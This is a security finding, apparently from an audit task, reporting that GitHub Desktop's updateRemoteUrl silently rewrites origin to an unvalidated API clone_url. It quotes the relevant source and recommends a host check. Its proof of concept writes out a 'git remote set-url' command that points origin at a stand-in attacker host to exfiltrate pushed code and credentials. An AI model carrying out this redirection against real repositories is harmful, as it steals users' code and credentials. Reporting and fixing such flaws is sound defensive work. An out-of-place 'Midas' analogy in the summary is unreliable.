### Title
Silent origin-remote rewrite from unverified GitHub API `clone_url` allows attacker-controlled redirection of pushes/fetches - ([File: app/src/lib/stores/updates/update-remote-url.ts])

### Summary
`updateRemoteUrl` automatically rewrites a repository's `origin` remote URL to whatever `clone_url` the GitHub API returns for the matched repository, with no check that the new host is the same trusted endpoint the repository was originally associated with. This mirrors the Midas pattern of "a value the app relies on for a security-relevant destination (investment/receiver address ↔ git remote) can silently drift because there is no proper validation/guard on the update path."

### Finding Description
`updateRemoteUrl` in `app/src/lib/stores/updates/update-remote-url.ts:7-45` is called from `repositoryWithRefreshedGitHubRepository` in `app/src/lib/stores/app-store.ts:4874-4913` any time Desktop refreshes GitHub metadata for a repository (e.g. account switch, periodic refresh). It fetches `apiRepo` via `api.fetchRepository(owner, name)` and, if:
- `protocolsMatch` (only `http`/`https` vs `ssh` string comparison, not host comparison), and
- `remoteUrlUnchanged` (the current remote still matches the *previously cached* `gitHubRepository.cloneURL`), and
- `!urlsMatch` (the new `clone_url` differs from the current remote)

...it silently calls `gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)` (`app/src/lib/stores/git-store.ts:1534-1543` → `app/src/lib/git/remote.ts:57-64`, i.e. `git remote set-url`).

`urlMatchesRemote`/`parseRemote` (`app/src/lib/repository-matching.ts:90-118`, `app/src/lib/remote-parsing.ts:55-64`) only compare the *structure* of two URL strings against each other (hostname/owner/name equality between old and new) — there is no check anchoring the new URL's hostname to the account's actual `endpoint` (e.g. `github.com` or the configured GHES host). The function's own guarding logic is designed only to detect "repo renamed on GitHub," not to validate the origin of the value.

Because `apiRepo` is data returned by the network response body of the GitHub/GHES REST API call, this value is attacker-influenced whenever: the user is connected to a GitHub Enterprise Server instance that is malicious/compromised, or a network-privileged actor can tamper with/spoof that API response. In either case, the returned `clone_url` field can be set to an arbitrary host+path while still passing every check in `updateRemoteUrl` (same protocol scheme, and the local remote hadn't been "manually" changed), causing Desktop to silently `git remote set-url origin <attacker-host>` with no user prompt, diff, or confirmation dialog.

### Impact Explanation
This is a "silent corruption of what the user commits or pushes" primitive: once `origin` is rewritten, the next `git push` from the user goes to the attacker's server (source exfiltration of code / credentials sent via HTTPS auth to the attacker host), and the next `git fetch`/`pull` retrieves content controlled by the attacker, which Desktop then presents/merges as if it came from the legitimate GitHub repository. There is no in-app warning that the remote URL changed underneath the user. This matches the valid-impact class explicitly (git remote/API-response-controlled attacker primitive leading to silent corruption of push/fetch destination and possible credential exposure to a rogue host).

### Likelihood Explanation
Requires the attacker to control (or MITM) the specific GitHub/GHES API response for `fetchRepository`, which is a real threat model already acknowledged as valid in the task scope ("a git remote/proxy response"). No local access, admin rights, or user action beyond normal background repository refresh is required, since `repositoryWithRefreshedGitHubRepository` runs automatically as part of account/repository refresh flows in `app-store.ts`.

### Recommendation
Before calling `gitStore.setRemoteURL`, validate that the hostname of `apiRepo.clone_url` matches the hostname of the account's known `endpoint` (the same endpoint used to fetch `apiRepo`), rejecting/ignoring updates to any other host. Additionally, consider surfacing a confirmation prompt to the user before silently rewriting `origin`, similar to how other remote-URL changes (e.g. `_setRemoteURL`) are explicit, user-initiated dispatcher actions.

### Proof of Concept
1. Add a GitHub Enterprise Server account in Desktop pointing to a server the attacker controls (or place an attacker on-path who can tamper with the TLS-terminated response, e.g. a corporate proxy with a trusted root CA).
2. User has a repository cloned from that GHES instance with `origin` = `https://ghes.company.com/owner/repo.git`, matching the cached `gitHubRepository.cloneURL`.
3. The malicious/compromised server responds to `GET /repos/owner/repo` with `clone_url: "https://ghes.attacker.example/owner/repo.git"` (still `https`, so `protocolsMatch` is true; `remoteUrlUnchanged` is true because origin still equals the cached clone URL; `urlsMatch` is false because hostnames differ).
4. On the next background refresh (`repositoryWithRefreshedGitHubRepository` → `updateRemoteUrl`, `app/src/lib/stores/updates/update-remote-url.ts:42-44`), Desktop silently runs `git remote set-url origin https://ghes.attacker.example/owner/repo.git`.
5. The user's next push/fetch now silently targets `ghes.attacker.example` with no dialog or warning, exfiltrating pushed code/credentials and allowing attacker-controlled content to be fetched as if from the trusted repository. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** app/src/lib/stores/updates/update-remote-url.ts (L7-45)
```typescript
export async function updateRemoteUrl(
  gitStore: GitStore,
  gitHubRepository: GitHubRepository,
  apiRepo: IAPIRepository
): Promise<void> {
  // I'm not sure when these early exit conditions would be met. But when they are
  // we don't have enough information to continue so exit early!
  if (gitStore.defaultRemote === null) {
    return
  }

  const remoteUrl = gitStore.defaultRemote.url
  const updatedRemoteUrl = apiRepo.clone_url
  const urlsMatch = urlMatchesRemote(updatedRemoteUrl, gitStore.defaultRemote)

  // Verify that protocol hasn't changed. If it has we don't want
  // to alter the protocol in case they are relying on a specific one.
  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe
  const parsedRemoteUrl = URL.parse(remoteUrl)
  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)
  const protocolsMatch =
    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
}
```

**File:** app/src/lib/stores/app-store.ts (L4900-4907)
```typescript

      return repository
    }

    if (repository.gitHubRepository) {
      const gitStore = this.gitStoreCache.get(repository)
      await updateRemoteUrl(gitStore, repository.gitHubRepository, apiRepo)
    }
```

**File:** app/src/lib/stores/git-store.ts (L1533-1543)
```typescript
  /** Changes the URL for the remote that matches the given name  */
  public async setRemoteURL(name: string, url: string): Promise<boolean> {
    const wasSuccessful =
      (await this.performFailableOperation(() =>
        setRemoteURL(this.repository, name, url)
      )) === true
    await this.loadRemotes()

    this.emitUpdate()
    return wasSuccessful
  }
```

**File:** app/src/lib/git/remote.ts (L56-64)
```typescript
/** Changes the URL for the remote that matches the given name  */
export async function setRemoteURL(
  repository: Repository,
  name: string,
  url: string
): Promise<true> {
  await git(['remote', 'set-url', name, url], repository.path, 'setRemoteURL')
  return true
}
```

**File:** app/src/lib/repository-matching.ts (L90-118)
```typescript
export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )
}
```

**File:** app/src/lib/remote-parsing.ts (L54-64)
```typescript
/** Parse the remote information from URL. */
export function parseRemote(url: string): IGitRemoteURL | null {
  for (const { protocol, regex } of remoteRegexes) {
    const match = regex.exec(url)
    if (match !== null && match.length >= 4) {
      return { protocol, hostname: match[1], owner: match[2], name: match[3] }
    }
  }

  return null
}
```
